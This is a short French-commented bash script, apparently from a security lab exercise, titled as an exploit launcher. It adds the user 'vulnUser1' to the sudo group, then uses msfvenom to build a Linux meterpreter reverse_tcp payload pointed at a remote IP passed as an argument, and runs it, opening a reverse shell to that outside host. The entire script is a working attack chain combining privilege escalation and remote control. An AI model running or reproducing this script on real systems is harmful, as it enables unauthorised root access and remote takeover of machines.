#!/bin/bash

if [ -z "$1" ]; then
  echo "Préciez @IP, Utilisation : ./use_exploit.sh IP_machine_distante >"
  exit 1
fi

#s'ajouter dans sudo
echo "ajout dans sudo ............"
adduser vulnUser1 sudo || { echo "erreur d'ajout dans sudo"; exit 1; }

# Verifier qu'on s'est bien ajouté dans le groupe sudo
echo "verification d'ajout dans sudo .........."
getent group sudo 

# creer un fichier de test
echo "fichier de test" > ../file_test.txt

echo "fichier de test crée : $(ls ../file_test.txt)"

# creer payload reverse_tcp
echo "Création du payload reverse_tcp ..........."
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=4444 -f elf -o reverse_tcp.elf
chmod +x reverse_tcp.elf

#lancer 
./reverse_tcp.elf
